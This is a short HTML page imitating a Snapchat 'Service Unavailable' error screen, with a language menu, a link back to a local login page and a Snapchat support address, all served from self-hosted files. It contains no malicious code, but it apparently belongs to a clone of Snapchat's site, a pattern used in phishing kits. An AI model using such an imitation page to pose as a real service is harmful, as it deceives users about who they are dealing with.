<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Service Issue</title>
    <link rel="stylesheet" href="Snapchat.css">
</head>
<body>
    <div class="container">
        <div class="language-container">
            <button class="language-btn" onclick="toggleLanguageMenu()">🌐</button>
            <div class="language-menu" id="language-menu">
                <a href="#" onclick="setLanguage('en')">English</a>
                <a href="#" onclick="setLanguage('fr')">Français</a>
            </div>
        </div>
        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
        <h1 id="title">Service Unavailable</h1>
        <p class="error-message" id="error-message">We’re currently experiencing technical difficulties with our servers.</p>
        <p id="error-subtitle">Please try again later. We’re working hard to resolve this issue as quickly as possible.</p>
        <a href="login.html" class="back-link" id="back-link">Return to Login</a>
        <p class="support-text" id="support-text">Need help? Contact support@snapchat.com</p>
    </div>
    <script src="script.js"></script>
</body>
</html>
